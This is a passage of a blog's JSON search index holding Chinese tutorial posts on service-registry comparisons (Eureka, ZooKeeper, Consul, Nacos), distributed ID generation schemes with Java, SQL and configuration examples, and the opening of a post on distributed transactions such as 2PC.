Server之间突然无法正常通信了，根据心跳机制，微服务将会被注销。那么这种心跳机制是不是就变得不太友好了？因为这种情况下微服务本身其实是健康的，本不应该注销这个微服务，因此Eureka就提供了一个自我保护机制。当Eureka Server节点在短时间内丢失过多客户端（可能发生了网络分区故障），默认是15分钟内收到的续约低于原来的85%时，这个节点就会进入自我保护模式。一旦进入该模式，Eureka Server仍能接收新服务的注册和查询请求，但是不会同步到其他节点上；同时也会保护服务注册表中的信息，不再移除注册列表中因为长时间没收到心跳而应该过期的服务。当网络故障恢复后，该Eureka Server节点会自动退出自我保护模式。\n因此，Eureka雪崩保护能力较弱。试想，按照上述说法，如果一个微服务提供者大部分节点都发生宕机或者与Eureka Server之间网络不通，但是Eureka Server与其他微服务提供者连接正常，即不满足“15分钟内收到的续约低于原来的85%”的条件，则Eureka Server根据心跳机制将该微服务无法连接的节点全部注销，流量全部去到该微服务的连通节点上，造成雪崩。\n Apache Zookeeper - CP 与 Eureka 有所不同，Apache Zookeeper 在设计时就紧遵CP原则，即任何时候对 Zookeeper 的访问请求能得到一致的数据结果，同时系统对网络分割具备容错性，但是 Zookeeper 不能保证每次服务请求都是可达的。\n从 Zookeeper 的实际应用情况来看，在使用 Zookeeper 获取服务列表时，如果此时的 Zookeeper 集群中的 Leader 宕机了，该集群就要进行 Leader 的选举，又或者 Zookeeper 集群中半数以上服务器节点不可用（例如有三个节点，如果节点一检测到节点三挂了 ，节点二也检测到节点三挂了，那这个节点才算是真的挂了），那么将无法处理该请求。所以说，Zookeeper 不能保证服务可用性。\n当然，在大多数分布式环境中，尤其是涉及到数据存储的场景，数据一致性应该是首先被保证的，这也是 Zookeeper 设计紧遵CP原则的另一个原因。\n但是对于服务发现来说，情况就不太一样了，针对同一个服务，即使注册中心的不同节点保存的服务提供者信息不尽相同，也并不会造成灾难性的后果。\n因为对于服务消费者来说，能消费才是最重要的，消费者虽然拿到可能不正确的服务实例信息后尝试消费一下，也要胜过因为无法获取实例信息而不去消费，导致系统异常要好（淘宝的双十一，京东的618就是紧遵AP的最好参照）。\n当master节点因为网络故障与其他节点失去联系时，剩余节点会重新进行leader选举。问题在于，选举leader的时间太长，30~120s，而且选举期间整个zk集群都是不可用的，这就导致在选举期间注册服务瘫痪。\n在云部署环境下， 因为网络问题使得zk集群失去master节点是大概率事件，虽然服务能最终恢复，但是漫长的选举事件导致注册长期不可用是不能容忍的。\nSpring Cloud Eureka - AP Spring Cloud Netflix 在设计 Eureka 时就紧遵AP原则（尽管现在2.0发布了，但是由于其闭源的原因 ，但是目前 Ereka 1.x 任然是比较活跃的）。\nEureka Server 也可以运行多个实例来构建集群，解决单点问题，但不同于 ZooKeeper 的选举 leader 的过程，Eureka Server 采用的是Peer to Peer 对等通信。这是一种去中心化的架构，无 master/slave 之分，每一个 Peer 都是对等的。在这种架构风格中，节点通过彼此互相注册来提高可用性，每个节点需要添加一个或多个有效的 serviceUrl 指向其他节点。每个节点都可被视为其他节点的副本。\n在集群环境中如果某台 Eureka Server 宕机，Eureka Client 的请求会自动切换到新的 Eureka Server 节点上，当宕机的服务器重新恢复后，Eureka 会再次将其纳入到服务器集群管理之中。当节点开始接受客户端请求时，所有的操作都会在节点间进行复制（replicate To Peer）操作，将请求复制到该 Eureka Server 当前所知的其它所有节点中。\n当一个新的 Eureka Server 节点启动后，会首先尝试从邻近节点获取所有注册列表信息，并完成初始化。Eureka Server 通过 getEurekaServiceUrls() 方法获取所有的节点，并且会通过心跳契约的方式定期更新。\n默认情况下，如果 Eureka Server 在一定时间内没有接收到某个服务实例的心跳（默认周期为30秒），Eureka Server 将会注销该实例（默认为90秒， eureka.instance.lease-expiration-duration-in-seconds 进行自定义配置）。\n当 Eureka Server 节点在短时间内丢失过多的心跳时，那么这个节点就会进入自我保护模式。\nEureka的集群中，只要有一台Eureka还在，就能保证注册服务可用（保证可用性），只不过查到的信息可能不是最新的（不保证强一致性）。除此之外，Eureka还有一种自我保护机制，如果在15分钟内超过85%的节点都没有正常的心跳，那么Eureka就认为客户端与注册中心出现了网络故障，此时会出现以下几种情况：\n Eureka不再从注册表中移除因为长时间没有收到心跳而过期的服务； Eureka仍然能够接受新服务注册和查询请求，但是不会被同步到其它节点上（即保证当前节点依然可用）； 当网络稳定时，当前实例新注册的信息会被同步到其它节点中；  因此，Eureka可以很好的应对因网络故障导致部分节点失去联系的情况，而不会像zookeeper那样使得整个注册服务瘫痪。\nConsul Consul 是 HashiCorp 公司推出的开源工具，用于实现分布式系统的服务发现与配置。Consul 使用 Go 语言编写，因此具有天然可移植性（支持Linux、windows和Mac OS X）。\nConsul 内置了服务注册与发现框架、分布一致性协议实现、健康检查、Key/Value 存储、多数据中心方案，不再需要依赖其他工具（比如 ZooKeeper 等），使用起来也较为简单。\nConsul 遵循CAP原理中的CP原则，保证了强一致性和分区容错性，且使用的是Raft算法，比zookeeper使用的Paxos算法更加简单。虽然保证了强一致性，但是可用性就相应下降了，例如服务注册的时间会稍长一些，因为 Consul 的 raft 协议要求必须过半数的节点都写入成功才认为注册成功 ；在leader挂掉了之后，重新选举出leader之前会导致Consul 服务不可用。\nConsul本质上属于应用外的注册方式，但可以通过SDK简化注册流程。而服务发现恰好相反，默认依赖于SDK，但可以通过Consul Template（下文会提到）去除SDK依赖。\nConsul Template Consul，默认服务调用者需要依赖Consul SDK来发现服务，这就无法保证对应用的零侵入性。\n所幸通过Consul Template ，可以定时从Consul集群获取最新的服务提供者列表并刷新LB配置（比如nginx的upstream），这样对于服务调用者而言，只需要配置一个统一的服务调用地址即可。\nConsul强一致性(C)带来的是：\n 服务注册相比Eureka会稍慢一些。因为Consul的raft协议要求必须过半数的节点都写入成功才认为注册成功 Leader挂掉时，重新选举期间整个consul不可用。保证了强一致性但牺牲了可用性。  Eureka保证高可用(A)和最终一致性：\n 服务注册相对要快，因为不需要等注册信息replicate到其他节点，也不保证注册信息是否replicate成功 当数据出现不一致时，虽然A, B上的注册信息不完全相同，但每个Eureka节点依然能够正常对外提供服务，这会出现查询服务信息时如果请求A查不到，但请求B就能查到。如此保证了可用性但牺牲了一致性。  其他方面，eureka就是个servlet程序，跑在servlet容器中; Consul则是go编写而成。\nNacos Nacos是阿里开源的，Nacos 支持基于 DNS 和基于 RPC 的服务发现。在Spring Cloud中使用Nacos，只需要先下载 Nacos 并启动 Nacos server，Nacos只需要简单的配置就可以完成服务的注册发现。\nNacos除了服务的注册发现之外，还支持动态配置服务。动态配置服务可以让您以中心化、外部化和动态化的方式管理所有环境的应用配置和服务配置。动态配置消除了配置变更时重新部署应用和服务的需要，让配置管理变得更加高效和敏捷。配置中心化管理让实现无状态服务变得更简单，让服务按需弹性扩展变得更容易。\n一句话概括就是Nacos = Spring Cloud注册中心 + Spring Cloud配置中心。\n参考 微服务：注册中心ZooKeeper、Eureka、Consul 、Nacos对比 注册中心选型篇-四款注册中心特点超全总结 解构 Dubbo-go 的核心注册引擎 Nacos ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/sa/%E5%87%A0%E7%A7%8D%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%AF%B9%E6%AF%94/","series":["Manual"],"tags":["SA"],"title":"几种注册中心对比"},{"categories":["计算机科学"],"content":"一、为什么要用分布式ID？ 在说分布式ID的具体实现之前，我们来简单分析一下为什么用分布式ID？分布式ID应该满足哪些特征？\n1、什么是分布式ID？ 拿MySQL数据库举个栗子：\n在我们业务数据量不大的时候，单库单表完全可以支撑现有业务，数据再大一点搞个MySQL主从同步读写分离也能对付。\n但随着数据日渐增长，主从同步也扛不住了，就需要对数据库进行分库分表，但分库分表后需要有一个唯一ID来标识一条数据，数据库的自增ID显然不能满足需求；特别一点的如订单、优惠券也都需要有唯一ID做标识。此时一个能够生成全局唯一ID的系统是非常必要的。那么这个全局唯一ID就叫分布式ID。\n2、那么分布式ID需要满足那些条件？  全局唯一：必须保证ID是全局性唯一的，基本要求 高性能：高可用低延时，ID生成响应要块，否则反倒会成为业务瓶颈 高可用：100%的可用性是骗人的，但是也要无限接近于100%的可用性 好接入：要秉着拿来即用的设计原则，在系统设计和实现上要尽可能的简单 趋势递增：最好趋势递增，这个要求就得看具体业务场景了，一般不严格要求  二、 分布式ID都有哪些生成方式？ 今天主要分析一下以下9种，分布式ID生成器方式以及优缺点：\n UUID 数据库自增ID 数据库多主模式 号段模式 Redis 雪花算法（SnowFlake） 滴滴出品（TinyID） 百度 （Uidgenerator） 美团（Leaf）  那么它们都是如何实现？以及各自有什么优缺点？我们往下看\n 以上图片源自网络，如有侵权联系删除\n 1、基于UUID 在Java的世界里，想要得到一个具有唯一性的ID，首先被想到可能就是UUID，毕竟它有着全球唯一的特性。那么UUID可以做分布式ID吗？答案是可以的，但是并不推荐！\npublic static void main(String[] args) { String uuid = UUID.randomUUID().toString().replaceAll(\u0026#34;-\u0026#34;,\u0026#34;\u0026#34;); System.out.println(uuid); } UUID的生成简单到只有一行代码，输出结果 c2b8c2b9e46c47e3b30dca3b0d447718，但UUID却并不适用于实际的业务需求。像用作订单号UUID这样的字符串没有丝毫的意义，看不出和订单相关的有用信息；而对于数据库来说用作业务主键ID，它不仅是太长还是字符串，存储性能差查询也很耗时，所以不推荐用作分布式ID。\n优点：\n 生成足够简单，本地生成无网络消耗，具有唯一性  缺点：\n 无序的字符串，不具备趋势自增特性 没有具体的业务含义 长度过长16 字节128位，36位长度的字符串，存储以及查询对MySQL的性能消耗较大，MySQL官方明确建议主键要尽量越短越好，作为数据库主键 UUID 的无序性会导致数据位置频繁变动，严重影响性能。  2、基于数据库自增ID 基于数据库的auto_increment自增ID完全可以充当分布式ID，具体实现：需要一个单独的MySQL实例用来生成ID，建表结构如下：\nCREATE DATABASE `SEQ_ID`; CREATE TABLE SEQID.SEQUENCE_ID ( id bigint(20) unsigned NOT NULL auto_increment, value char(10) NOT NULL default \u0026#39;\u0026#39;, PRIMARY KEY (id), ) ENGINE=MyISAM; insert into SEQUENCE_ID(value) VALUES (\u0026#39;values\u0026#39;); 当我们需要一个ID的时候，向表中插入一条记录返回主键ID，但这种方式有一个比较致命的缺点，访问量激增时MySQL本身就是系统的瓶颈，用它来实现分布式服务风险比较大，不推荐！\n优点：\n 实现简单，ID单调自增，数值类型查询速度快  缺点：\n DB单点存在宕机风险，无法扛住高并发场景  3、基于数据库集群模式 前边说了单点数据库方式不可取，那对上边的方式做一些高可用优化，换成主从模式集群。害怕一个主节点挂掉没法用，那就做双主模式集群，也就是两个Mysql实例都能单独的生产自增ID。\n那这样还会有个问题，两个MySQL实例的自增ID都从1开始，会生成重复的ID怎么办？\n解决方案：设置起始值和自增步长\nMySQL_1 配置：\nset @@auto_increment_offset = 1; -- 起始值 set @@auto_increment_increment = 2; -- 步长 MySQL_2 配置：\nset @@auto_increment_offset = 2; -- 起始值 set @@auto_increment_increment = 2; -- 步长 这样两个MySQL实例的自增ID分别就是：\n 1、3、5、7、9\n2、4、6、8、10\n 那如果集群后的性能还是扛不住高并发咋办？就要进行MySQL扩容增加节点，这是一个比较麻烦的事。\n从上图可以看出，水平扩展的数据库集群，有利于解决数据库单点压力的问题，同时为了ID生成特性，将自增步长按照机器数量来设置。\n增加第三台MySQL实例需要人工修改一、二两台MySQL实例的起始值和步长，把第三台机器的ID起始生成位置设定在比现有最大自增ID的位置远一些，但必须在一、二两台MySQL实例ID还没有增长到第三台MySQL实例的起始ID值的时候，否则自增ID就要出现重复了，必要时可能还需要停机修改。\n优点：\n 解决DB单点问题  缺点：\n 不利于后续扩容，而且实际上单个数据库自身压力还是大，依旧无法满足高并发场景。  4、基于数据库的号段模式 号段模式是当下分布式ID生成器的主流实现方式之一，号段模式可以理解为从数据库批量的获取自增ID，每次从数据库取出一个号段范围，例如 (1,1000] 代表1000个ID，具体的业务服务将本号段，生成1~1000的自增ID并加载到内存。表结构如下：\nCREATE TABLE id_generator ( id int(10) NOT NULL, max_id bigint(20) NOT NULL COMMENT \u0026#39;当前最大id\u0026#39;, step int(20) NOT NULL COMMENT \u0026#39;号段的布长\u0026#39;, biz_type int(20) NOT NULL COMMENT \u0026#39;业务类型\u0026#39;, version int(20) NOT NULL COMMENT \u0026#39;版本号\u0026#39;, PRIMARY KEY (`id`) ) biz_type ：代表不同业务类型\nmax_id ：当前最大的可用id\nstep ：代表号段的长度\nversion ：是一个乐观锁，每次都更新version，保证并发时数据的正确性\n   id biz_type max_id step version     1 101 1000 2000 0    等这批号段ID用完，再次向数据库申请新号段，对max_id字段做一次update操作，update max_id= max_id + step，update成功则说明新号段获取成功，新的号段范围是(max_id ,max_id +step]。\nupdate id_generator set max_id = #{max_id+step}, version = version + 1 where version = # {version} and biz_type = XXX 由于多业务端可能同时操作，所以采用版本号version乐观锁方式更新，这种分布式ID生成方式不强依赖于数据库，不会频繁的访问数据库，对数据库的压力小很多。\n5、基于Redis模式 Redis也同样可以实现，原理就是利用redis的 incr命令实现ID的原子性自增。\n127.0.0.1:6379\u0026gt; set seq_id 1 // 初始化自增ID为1 OK 127.0.0.1:6379\u0026gt; incr seq_id // 增加1，并返回递增后的数值 (integer) 2 用redis实现需要注意一点，要考虑到redis持久化的问题。redis有两种持久化方式RDB和AOF\n RDB会定时打一个快照进行持久化，假如连续自增但redis没及时持久化，而这会Redis挂掉了，重启Redis后会出现ID重复的情况。 AOF会对每条写命令进行持久化，即使Redis挂掉了也不会出现ID重复的情况，但由于incr命令的特殊性，会导致Redis重启恢复的数据时间过长。  6、基于雪花算法（Snowflake）模式 雪花算法（Snowflake）是twitter公司内部分布式项目采用的ID生成算法，开源后广受国内大厂的好评，在该算法影响下各大公司相继开发出各具特色的分布式生成器。\n 以上图片源自网络，如有侵权联系删除\n Snowflake生成的是Long类型的ID，一个Long类型占8个字节，每个字节占8比特，也就是说一个Long类型占64个比特。\nSnowflake ID组成结构：正数位（占1比特）+ 时间戳（占41比特）+ 机器ID（占5比特）+ 数据中心（占5比特）+ 自增值（占12比特），总共64比特组成的一个Long类型。\n 第一个bit位（1bit）：Java中long的最高位是符号位代表正负，正数是0，负数是1，一般生成ID都为正数，所以默认为0。 时间戳部分（41bit）：毫秒级的时间，不建议存当前时间戳，而是用（当前时间戳 - 固定开始时间戳）的差值，可以使产生的ID从更小的值开始；41位的时间戳可以使用69年，(1L \u0026laquo; 41) / (1000L * 60 * 60 * 24 * 365) = 69年 工作机器id（10bit）：也被叫做workId，这个可以灵活配置，机房或者机器号组合都可以。 序列号部分（12bit），自增值支持同一毫秒内同一个节点可以生成4096个ID  根据这个算法的逻辑，只需要将这个算法用Java语言实现出来，封装为一个工具方法，那么各个业务应用可以直接使用该工具方法来获取分布式ID，只需保证每个业务应用有自己的工作机器id即可，而不需要单独去搭建一个获取分布式ID的应用。\nJava版本的Snowflake算法实现：\n/** * Twitter的SnowFlake算法,使用SnowFlake算法生成一个整数，然后转化为62进制变成一个短地址URL * * https://github.com/beyondfengyu/SnowFlake */ public class SnowFlakeShortUrl { /** * 起始的时间戳 */ private final static long START_TIMESTAMP = 1480166465631L; /** * 每一部分占用的位数 */ private final static long SEQUENCE_BIT = 12; //序列号占用的位数  private final static long MACHINE_BIT = 5; //机器标识占用的位数  private final static long DATA_CENTER_BIT = 5; //数据中心占用的位数  /** * 每一部分的最大值 */ private final static long MAX_SEQUENCE = -1L ^ (-1L \u0026lt;\u0026lt; SEQUENCE_BIT); private final static long MAX_MACHINE_NUM = -1L ^ (-1L \u0026lt;\u0026lt; MACHINE_BIT); private final static long MAX_DATA_CENTER_NUM = -1L ^ (-1L \u0026lt;\u0026lt; DATA_CENTER_BIT); /** * 每一部分向左的位移 */ private final static long MACHINE_LEFT = SEQUENCE_BIT; private final static long DATA_CENTER_LEFT = SEQUENCE_BIT + MACHINE_BIT; private final static long TIMESTAMP_LEFT = DATA_CENTER_LEFT + DATA_CENTER_BIT; private long dataCenterId; //数据中心  private long machineId; //机器标识  private long sequence = 0L; //序列号  private long lastTimeStamp = -1L; //上一次时间戳  private long getNextMill() { long mill = getNewTimeStamp(); while (mill \u0026lt;= lastTimeStamp) { mill = getNewTimeStamp(); } return mill; } private long getNewTimeStamp() { return System.currentTimeMillis(); } /** * 根据指定的数据中心ID和机器标志ID生成指定的序列号 * * @param dataCenterId 数据中心ID * @param machineId 机器标志ID */ public SnowFlakeShortUrl(long dataCenterId, long machineId) { if (dataCenterId \u0026gt; MAX_DATA_CENTER_NUM || dataCenterId \u0026lt; 0) { throw new IllegalArgumentException(\u0026#34;DtaCenterId can\u0026#39;t be greater than MAX_DATA_CENTER_NUM or less than 0！\u0026#34;); } if (machineId \u0026gt; MAX_MACHINE_NUM || machineId \u0026lt; 0) { throw new IllegalArgumentException(\u0026#34;MachineId can\u0026#39;t be greater than MAX_MACHINE_NUM or less than 0！\u0026#34;); } this.dataCenterId = dataCenterId; this.machineId = machineId; } /** * 产生下一个ID * * @return */ public synchronized long nextId() { long currTimeStamp = getNewTimeStamp(); if (currTimeStamp \u0026lt; lastTimeStamp) { throw new RuntimeException(\u0026#34;Clock moved backwards. Refusing to generate id\u0026#34;); } if (currTimeStamp == lastTimeStamp) { //相同毫秒内，序列号自增  sequence = (sequence + 1) \u0026amp; MAX_SEQUENCE; //同一毫秒的序列数已经达到最大  if (sequence == 0L) { currTimeStamp = getNextMill(); } } else { //不同毫秒内，序列号置为0  sequence = 0L; } lastTimeStamp = currTimeStamp; return (currTimeStamp - START_TIMESTAMP) \u0026lt;\u0026lt; TIMESTAMP_LEFT //时间戳部分  | dataCenterId \u0026lt;\u0026lt; DATA_CENTER_LEFT //数据中心部分  | machineId \u0026lt;\u0026lt; MACHINE_LEFT //机器标识部分  | sequence; //序列号部分  } public static void main(String[] args) { SnowFlakeShortUrl snowFlake = new SnowFlakeShortUrl(2, 3); for (int i = 0; i \u0026lt; (1 \u0026lt;\u0026lt; 4); i++) { //10进制  System.out.println(snowFlake.nextId()); } } } 7、百度（uid-generator） uid-generator是由百度技术部开发，项目GitHub地址 https://github.com/baidu/uid-generator uid-generator是基于Snowflake算法实现的，与原始的snowflake算法不同在于，uid-generator支持自定义时间戳、工作机器ID和 序列号 等各部分的位数，而且uid-generator中采用用户自定义workId的生成策略。\nuid-generator需要与数据库配合使用，需要新增一个WORKER_NODE表。当应用启动时会向数据库表中去插入一条数据，插入成功后返回的自增ID就是该机器的workId数据由host，port组成。\n对于uid-generator ID组成结构：\nworkId，占用了22个bit位，时间占用了28个bit位，序列化占用了13个bit位，需要注意的是，和原始的snowflake不太一样，时间的单位是秒，而不是毫秒，workId也不一样，而且同一应用每次重启就会消费一个workId。\n 参考文献 https://github.com/baidu/uid-generator/blob/master/README.zh_cn.md  8、美团（Leaf） Leaf由美团开发，github地址：https://github.com/Meituan-Dianping/Leaf\nLeaf同时支持号段模式和snowflake算法模式，可以切换使用。\n号段模式 先导入源码 https://github.com/Meituan-Dianping/Leaf ，在建一张表leaf_alloc\nDROP TABLE IF EXISTS `leaf_alloc`; CREATE TABLE `leaf_alloc` ( `biz_tag` varchar(128) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;业务key\u0026#39;, `max_id` bigint(20) NOT NULL DEFAULT \u0026#39;1\u0026#39; COMMENT \u0026#39;当前已经分配了的最大id\u0026#39;, `step` int(11) NOT NULL COMMENT \u0026#39;初始步长，也是动态调整的最小步长\u0026#39;, `description` varchar(256) DEFAULT NULL COMMENT \u0026#39;业务key的描述\u0026#39;, `update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT \u0026#39;数据库维护的更新时间\u0026#39;, PRIMARY KEY (`biz_tag`) ) ENGINE=InnoDB; 然后在项目中开启号段模式，配置对应的数据库信息，并关闭snowflake模式\nleaf.name=com.sankuai.leaf.opensource.test leaf.segment.enable=true leaf.jdbc.url=jdbc:mysql://localhost:3306/leaf_test?useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;characterSetResults=utf8 leaf.jdbc.username=root leaf.jdbc.password=root leaf.snowflake.enable=false #leaf.snowflake.zk.address= #leaf.snowflake.port= 启动leaf-server 模块的 LeafServerApplication项目就跑起来了\n号段模式获取分布式自增ID的测试url ：http：//localhost：8080/api/segment/get/leaf-segment-test\n监控号段模式：http://localhost:8080/cache\nsnowflake模式 Leaf的snowflake模式依赖于ZooKeeper，不同于原始snowflake算法也主要是在workId的生成上，Leaf中workId是基于ZooKeeper的顺序Id来生成的，每个应用在使用Leaf-snowflake时，启动时都会都在Zookeeper中生成一个顺序Id，相当于一台机器对应一个顺序节点，也就是一个workId。\nleaf.snowflake.enable=true leaf.snowflake.zk.address=127.0.0.1 leaf.snowflake.port=2181 snowflake模式获取分布式自增ID的测试url：http://localhost:8080/api/snowflake/get/test\n9、滴滴（Tinyid） Tinyid由滴滴开发，Github地址：https://github.com/didi/tinyid。\nTinyid是基于号段模式原理实现的与Leaf如出一辙，每个服务获取一个号段（1000,2000]、（2000,3000]、（3000,4000]\nTinyid提供http和tinyid-client两种方式接入\nHttp方式接入 （1）导入Tinyid源码：\ngit clone https://github.com/didi/tinyid.git （2）创建数据表：\nCREATE TABLE `tiny_id_info` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT \u0026#39;自增主键\u0026#39;, `biz_type` varchar(63) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;业务类型，唯一\u0026#39;, `begin_id` bigint(20) NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;开始id，仅记录初始值，无其他含义。初始化时begin_id和max_id应相同\u0026#39;, `max_id` bigint(20) NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;当前最大id\u0026#39;, `step` int(11) DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;步长\u0026#39;, `delta` int(11) NOT NULL DEFAULT \u0026#39;1\u0026#39; COMMENT \u0026#39;每次id增量\u0026#39;, `remainder` int(11) NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;余数\u0026#39;, `create_time` timestamp NOT NULL DEFAULT \u0026#39;2010-01-01 00:00:00\u0026#39; COMMENT \u0026#39;创建时间\u0026#39;, `update_time` timestamp NOT NULL DEFAULT \u0026#39;2010-01-01 00:00:00\u0026#39; COMMENT \u0026#39;更新时间\u0026#39;, `version` bigint(20) NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;版本号\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uniq_biz_type` (`biz_type`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8 COMMENT \u0026#39;id信息表\u0026#39;; CREATE TABLE `tiny_id_token` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT \u0026#39;自增id\u0026#39;, `token` varchar(255) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;token\u0026#39;, `biz_type` varchar(63) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;此token可访问的业务类型标识\u0026#39;, `remark` varchar(255) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;备注\u0026#39;, `create_time` timestamp NOT NULL DEFAULT \u0026#39;2010-01-01 00:00:00\u0026#39; COMMENT \u0026#39;创建时间\u0026#39;, `update_time` timestamp NOT NULL DEFAULT \u0026#39;2010-01-01 00:00:00\u0026#39; COMMENT \u0026#39;更新时间\u0026#39;, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8 COMMENT \u0026#39;token信息表\u0026#39;; INSERT INTO `tiny_id_info` (`id`, `biz_type`, `begin_id`, `max_id`, `step`, `delta`, `remainder`, `create_time`, `update_time`, `version`) VALUES (1, \u0026#39;test\u0026#39;, 1, 1, 100000, 1, 0, \u0026#39;2018-07-21 23:52:58\u0026#39;, \u0026#39;2018-07-22 23:19:27\u0026#39;, 1); INSERT INTO `tiny_id_info` (`id`, `biz_type`, `begin_id`, `max_id`, `step`, `delta`, `remainder`, `create_time`, `update_time`, `version`) VALUES (2, \u0026#39;test_odd\u0026#39;, 1, 1, 100000, 2, 1, \u0026#39;2018-07-21 23:52:58\u0026#39;, \u0026#39;2018-07-23 00:39:24\u0026#39;, 3); INSERT INTO `tiny_id_token` (`id`, `token`, `biz_type`, `remark`, `create_time`, `update_time`) VALUES (1, \u0026#39;0f673adf80504e2eaa552f5d791b644c\u0026#39;, \u0026#39;test\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2017-12-14 16:36:46\u0026#39;, \u0026#39;2017-12-14 16:36:48\u0026#39;); INSERT INTO `tiny_id_token` (`id`, `token`, `biz_type`, `remark`, `create_time`, `update_time`) VALUES (2, \u0026#39;0f673adf80504e2eaa552f5d791b644c\u0026#39;, \u0026#39;test_odd\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2017-12-14 16:36:46\u0026#39;, \u0026#39;2017-12-14 16:36:48\u0026#39;); （3）配置数据库：\ndatasource.tinyid.names=primary datasource.tinyid.primary.driver-class-name=com.mysql.jdbc.Driver datasource.tinyid.primary.url=jdbc:mysql://ip:port/databaseName?autoReconnect=true\u0026amp;useUnicode=true\u0026amp;characterEncoding=UTF-8 datasource.tinyid.primary.username=root datasource.tinyid.primary.password=123456 （4）启动tinyid-server后测试\n获取分布式自增ID: http://localhost:9999/tinyid/id/nextIdSimple?bizType=test\u0026amp;token=0f673adf80504e2eaa552f5d791b644c' 返回结果: 3 批量获取分布式自增ID: http://localhost:9999/tinyid/id/nextIdSimple?bizType=test\u0026amp;token=0f673adf80504e2eaa552f5d791b644c\u0026amp;batchSize=10' 返回结果: 4,5,6,7,8,9,10,11,12,13 Java客户端方式接入 重复Http方式的（2）（3）操作\n引入依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.xiaoju.uemc.tinyid\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tinyid-client\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${tinyid.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 配置文件\ntinyid.server =localhost:9999 tinyid.token =0f673adf80504e2eaa552f5d791b644c test 、tinyid.token是在数据库表中预先插入的数据，test 是具体业务类型，tinyid.token表示可访问的业务类型\n// 获取单个分布式自增ID Long id = TinyId . nextId( \u0026#34; test \u0026#34; ); // 按需批量分布式自增ID List\u0026lt; Long \u0026gt; ids = TinyId . nextId( \u0026#34; test \u0026#34; , 10 );  总结 本文只是简单介绍一下每种分布式ID生成器，旨在给大家一个详细学习的方向，每种生成方式都有它自己的优缺点，具体如何使用还要看具体的业务需求。\n参考 一口气说出9种分布式ID生成方式，面试官有点懵了 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/distributed/%E5%88%86%E5%B8%83%E5%BC%8Fid%E7%94%9F%E6%88%90%E6%96%B9%E5%BC%8F/","series":["Manual"],"tags":["分布式","CS"],"title":"分布式ID生成方式"},{"categories":["计算机科学"],"content":"2PC对多方资源进行全局锁定，非常影响性能，例如Spring JTA；3PC尝试解决2PC的问题，引入资源参与者超时机制，一方资源参与者不可用不至于导致全局资源锁定等措施，但是收效甚微，且使得交互流程变长变复杂；TCC需要业务系统自己针对每一个操作实现Try - Confirm - Cancel 方法，好处是可以跨数据库、跨不同的业务系统实现事务，坏处是与业务代码耦合（参考Seata的TCC模式）；Saga参与者提交自己的本地事务，但是每个正向事务操作，就要对应一个逆向的补偿事务操作（参考Seata的Saga模式）;性价比最高的分布式事务应该要数本地消息表；还可以使用RocketMQ消息事务，如果MQ不支持消息事务，可以使用MQ+本地消息表达到一样的效果。\n分布式事务顾名思义就是要在分布式系统中实现事务，它其实是由多个本地事务组合而成。对于分布式事务而言几乎满足不了 ACID，其实对于单机事务而言大部分情况下也没有满足 ACID，不然怎么会有四种隔离级别呢？所以更别说分布在不同数据库或者不同应用上的分布式事务了。\n2PC 2PC（Two-phase commit protocol），中文叫二阶段提交。 二阶段提交是一种强一致性设计，2PC 引入一个事务协调者的角色来协调管理各参与者（也可称之为各本地资源）的提交和回滚，二阶段分别指的是准备（投票）和提交两个阶段。\n**准备阶段**协调者会给各参与者发送准备命令，你可以把准备命令理解成除了提交事务之外啥事都做完了。\n同步等待所有资源的响应之后就进入第二阶段即**提交阶段**（注意提交阶段不一定是提交事务，也可能是回滚事务）。\n假如在第一阶段所有参与者都返回准备成功，那么协调者则向所有参与者发送提交事务命令，然后等待所有事务都提交成功之后，返回事务执行成功。\n假如在第一阶段有一个参与者返回失败，那么协调者就会向所有参与者发送回滚事务的请求，即分布式事务执行失败。\n首先 2PC 是一个同步阻塞协议，像第一阶段协调者会等待所有参与者响应才会进行下一步操作，当然第一阶段的协调者有超时机制，假设因为网络原因没有收到某参与者的响应或某参与者挂了，那么超时后就会判断事务失败，向所有参与者发送回滚命令。\n在第二阶段协调者的没法超时，只能不断重试，这里有两种情况：\n第一种是第二阶段执行的是回滚事务操作，那么答案是不断重试，直到所有参与者都回滚了，不然那些在第一阶段准备成功的参与者会一直阻塞着。\n第二种是第二阶段执行的是提交事务操作，那么答案也是不断重试，因为有可能一些参与者的事务已经提交成功了，这个时候只有一条路，就是头铁往前冲，不断的重试，直到提交成功，到最后真的不行只能人工介入处理。\n至此我们已经详细的分析的 2PC 的各种细节，我们来总结一下：\n 2PC 是一种尽量保证强一致性的分布式事务，因此它是同步阻塞的，而同步阻塞就导致长久的资源锁定问题，总体而言效率低，并且存在单点故障问题，在极端条件下存在数据不一致的风险。\n当然具体的实现可以变形，而且 2PC 也有变种，例如 Tree 2PC、Dynamic 